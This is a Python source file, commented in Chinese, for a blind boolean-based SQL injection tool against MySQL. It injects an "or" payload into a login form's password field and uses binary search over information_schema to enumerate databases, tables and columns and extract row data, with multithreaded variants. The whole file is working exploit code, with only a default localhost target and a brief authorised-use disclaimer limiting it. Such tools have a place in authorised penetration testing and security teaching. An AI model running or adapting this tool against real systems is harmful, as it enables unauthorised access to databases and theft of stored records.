# -*- coding: utf-8 -*-
"""
MySQL SQL注入测试工具
用于安全测试和渗透测试，请仅在授权的环境中使用

核心设计：
- req函数完全由用户自定义，包括URL、请求方式、参数、代理、判断逻辑等
- 工具只提供框架，不预设任何配置
- 用户需要根据具体目标环境编写自己的req函数
"""

import sys
import time
import requests
import threading
import warnings
from typing import List, Optional

warnings.filterwarnings("ignore")

# 字符集定义 - 优化为直接使用ASCII范围
CHAR_RANGES = [
    (97, 122),   # a-z
    (65, 90),    # A-Z
    (48, 57),    # 0-9
]
SPECIAL_CHARS = "_$#-{}()'+[]:/\\,@."

def get_char_set():
    """获取字符集 - 优化版本"""
    chars = []
    for start, end in CHAR_RANGES:
        chars.extend(range(start, end + 1))
    chars.extend(ord(c) for c in SPECIAL_CHARS)
    return sorted(chars)

# ==================== 核心函数：req函数需要用户完全自定义 ====================
def req(payload):
    """
    核心请求函数 - 需要用户完全自定义
    
    参数:
        payload: SQL注入载荷，如 "1=1", "sleep(1)" 等
    
    返回值:
        1: 注入成功（根据用户自定义逻辑判断）
        2: 注入失败（根据用户自定义逻辑判断）
        3: 网络错误
    
    用户需要自定义的内容：
    1. 目标URL
    2. 请求方式（GET/POST等）
    3. 请求参数和注入点
    4. 代理设置
    5. 请求头
    6. 判断注入成功的逻辑
    7. 错误处理
    """
    
    # ========== 用户自定义区域开始 ==========
    
    # 1. 目标URL - 用户需要修改
    url = "http://127.0.0.1:3333/index.php"
    
    # 2. 请求参数 - 用户需要根据实际情况修改
    data = "username=admin&password=admin' or "+str(payload)+" #"
    
    # 3. 请求头 - 用户可以根据需要修改
    headers = {
        "Content-Type" : "application/x-www-form-urlencoded"
    }
    
    # 4. 代理设置 - 用户可以根据需要修改
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    
    # 5. 发送请求 - 用户可以根据需要修改请求方式
    r = requests.post(url=url, proxies=proxies, headers=headers, data=data)
    resContent = r.content
    
    # 6. 判断逻辑 - 用户需要根据目标系统响应特征自定义
    if "登录成功" in resContent.decode('utf-8'):
        return 1  # 注入成功
    else:
        return 2  # 注入失败
    
    # ========== 用户自定义区域结束 ==========
    
    # 网络错误处理
    return 3

# ==================== 优化后的核心算法 ====================

def binary_search_count(sql_template: str) -> int:
    """
    使用二分搜索计算记录数量 - 优化版本
    """
    left, right = 0, 10000
    
    while left < right:
        mid = (left + right) // 2
        payload = sql_template.format(mid)
        status = req(payload)
        
        if status == 1:  # 成功
            left = mid + 1
        else:  # 失败
            right = mid
    
    return left

def binary_search_string(sql_template: str, length: int) -> str:
    """
    使用二分搜索提取字符串 - 优化版本
    """
    char_set = get_char_set()
    result = ""
    
    for pos in range(1, length + 1):
        left, right = 0, len(char_set)
        
        while left < right:
            mid = (left + right) // 2
            char_val = char_set[mid]
            payload = sql_template.format(pos, char_val)
            status = req(payload)
            
            if status == 1:  # 成功
                left = mid + 1
            else:  # 失败
                right = mid
        
        if left < len(char_set):
            try:
                result += chr(char_set[left])
                print(f"当前结果: {result}")
            except:
                result += "${特殊字符}"
    
    return result

# ==================== 数据库操作函数 - 优化版本 ====================

def get_dbs() -> List[str]:
    """获取所有数据库名称"""
    count_sql = "(select count(*) from information_schema.SCHEMATA) > {}"
    db_count = binary_search_count(count_sql)
    
    databases = []
    for i in range(db_count):
        db_name = get_db_name(i)
        databases.append(db_name)
        print(f"发现数据库: {db_name}")
    
    return databases

def get_tables(db_name: str) -> List[str]:
    """获取指定数据库的所有表名"""
    count_sql = f"(select count(*) from information_schema.TABLES where TABLE_SCHEMA = '{db_name}') > {{}}"
    table_count = binary_search_count(count_sql)
    
    tables = []
    for i in range(table_count):
        table_name = get_table_name(db_name, i)
        tables.append(table_name)
    
    return tables

def get_columns(db_name: str, table_name: str) -> List[str]:
    """获取指定表的所有列名"""
    count_sql = f"(select count(*) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}') > {{}}"
    column_count = binary_search_count(count_sql)
    
    columns = []
    for i in range(column_count):
        column_name = get_column_name(db_name, table_name, i)
        columns.append(column_name)
    
    return columns

def get_data(db_name: str, table_name: str, column_name: str, 
             where_clause: str = "1=1", row_index: int = 0) -> str:
    """获取指定列的数据"""
    length_sql = f"(select length({column_name}) from {db_name}.{table_name} where {where_clause} limit {row_index},1) > {{}}"
    data_length = binary_search_count(length_sql)
    
    data_sql = f"(select ord(substring({column_name}, {{}}, 1)) from {db_name}.{table_name} where {where_clause} limit {row_index},1) > {{}}"
    return binary_search_string(data_sql, data_length)

def get_all_data(db_name: str, table_name: str, 
                 where_clause: str = "1=1", max_rows: int = 10) -> List[dict]:
    """获取表的所有数据"""
    # 获取列名
    columns = get_columns(db_name, table_name)
    
    # 获取行数
    count_sql = f"(select count(*) from {db_name}.{table_name} where {where_clause}) > {{}}"
    row_count = min(binary_search_count(count_sql), max_rows)
    
    all_data = []
    for row_index in range(row_count):
        row_data = {}
        for column in columns:
            value = get_data(db_name, table_name, column, where_clause, row_index)
            row_data[column] = value
        all_data.append(row_data)
        print(f"获取第 {row_index + 1} 行数据完成")
    
    return all_data

# ==================== 内部辅助函数 - 优化版本 ====================

def get_db_name(index: int) -> str:
    """获取数据库名称"""
    length_sql = f"(select length(SCHEMA_NAME) from information_schema.SCHEMATA limit {index},1) > {{}}"
    name_length = binary_search_count(length_sql)
    
    name_sql = f"(select ord(substring(SCHEMA_NAME, {{}}, 1)) from information_schema.SCHEMATA limit {index},1) > {{}}"
    return binary_search_string(name_sql, name_length)

def get_table_name(db_name: str, index: int) -> str:
    """获取表名称"""
    length_sql = f"(select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = '{db_name}' limit {index},1) > {{}}"
    name_length = binary_search_count(length_sql)
    
    name_sql = f"(select ord(substring(TABLE_NAME, {{}}, 1)) from information_schema.TABLES where TABLE_SCHEMA = '{db_name}' limit {index},1) > {{}}"
    return binary_search_string(name_sql, name_length)

def get_column_name(db_name: str, table_name: str, index: int) -> str:
    """获取列名称"""
    length_sql = f"(select length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}' limit {index},1) > {{}}"
    name_length = binary_search_count(length_sql)
    
    name_sql = f"(select ord(substring(COLUMN_NAME, {{}}, 1)) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}' limit {index},1) > {{}}"
    return binary_search_string(name_sql, name_length)

# ==================== 多线程优化版本 ====================

class ThreadWorker(threading.Thread):
    """线程工作类"""
    def __init__(self, func, args):
        super().__init__()
        self.func = func
        self.args = args
        self.result = None
    
    def run(self):
        self.result = self.func(*self.args)

def parallel_get_columns(db_name: str, table_name: str) -> List[str]:
    """多线程获取列名"""
    count_sql = f"(select count(*) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}') > {{}}"
    column_count = binary_search_count(count_sql)
    
    threads = []
    for i in range(column_count):
        thread = ThreadWorker(get_column_name, (db_name, table_name, i))
        threads.append(thread)
        thread.start()
    
    columns = []
    for thread in threads:
        thread.join()
        columns.append(thread.result)
    
    return columns

def parallel_get_data(db_name: str, table_name: str, 
                     where_clause: str = "1=1", row_index: int = 0) -> dict:
    """多线程获取行数据"""
    columns = parallel_get_columns(db_name, table_name)
    
    threads = []
    for column in columns:
        thread = ThreadWorker(get_data, (db_name, table_name, column, where_clause, row_index))
        threads.append(thread)
        thread.start()
    
    row_data = {}
    for i, thread in enumerate(threads):
        thread.join()
        row_data[columns[i]] = thread.result
    
    return row_data

# ==================== 便捷函数 ====================

def quick_scan(db_name: str, table_name: str, max_rows: int = 3):
    """快速扫描表数据"""
    print(f"快速扫描: {db_name}.{table_name}")
    
    # 获取列名
    columns = get_columns(db_name, table_name)
    print(f"列: {columns}")
    
    # 获取数据
    data = get_all_data(db_name, table_name, max_rows=max_rows)
    print(f"数据: {data}")
    
    return data

def get_database_info() -> dict:
    """获取数据库信息摘要"""
    databases = get_dbs()
    info = {}
    
    for db_name in databases:
        tables = get_tables(db_name)
        table_info = {}
        
        for table_name in tables:
            columns = get_columns(db_name, table_name)
            table_info[table_name] = columns
        
        info[db_name] = table_info
    
    return info

# ==================== 主程序 ====================

if __name__ == "__main__":
    print("MySQL SQL注入测试工具 - 优化版本")
    print("=" * 50)
    print("重要提示：")
    print("1. 请先修改req函数中的目标URL、请求参数、代理设置等")
    print("2. 根据目标系统响应特征自定义判断逻辑")
    print("3. 确保有合法的测试权限")
    print("=" * 50)
    
    # 示例用法
    # databases = get_dbs()  # 获取所有数据库
    # print(databases)
    # tables = get_tables("testdb")  # 获取指定数据库的表
    # columns = get_columns("testdb", "user")  # 获取指定表的列
    data = quick_scan("testdb", "user")  # 快速扫描表数据
    
    print("工具已优化完成，请根据实际需求修改req函数后使用")